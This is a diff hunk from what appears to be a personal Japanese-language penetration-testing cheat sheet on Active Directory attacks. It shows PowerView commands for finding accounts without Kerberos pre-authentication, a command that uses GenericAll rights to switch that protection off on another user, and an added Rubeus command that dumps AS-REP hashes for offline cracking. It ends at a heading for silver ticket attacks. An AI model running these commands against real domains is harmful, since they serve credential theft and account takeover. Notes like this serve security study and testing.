@@ -41,9 +41,10 @@ sudo dpkg -i python3-openssl_24.0.0-1_all.deb
 //powerView（power shellのモジュール)
 Import-Module .\PowerView.ps1 #ターゲットのPS上でpowerviewをインポート
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH #ASReproastingの対象となるユーザの探索
-Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose #GenericAll権限があるユーザでほかのユーザにASReproastingが効くようにする
+Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose #GenericAll権限があるユーザでほかのユーザにASReproastingが効くようにする
 
-//Rubeus.exe asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる
+//Rubeus.exe (asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる)
+ .\Rubeus.exe asreproast /user:<user名> /domain:<domain> /dc:<dc name> /nowrap /outfile:hash.txt
 
 ***メモ***
 【シルバーチケット攻撃】
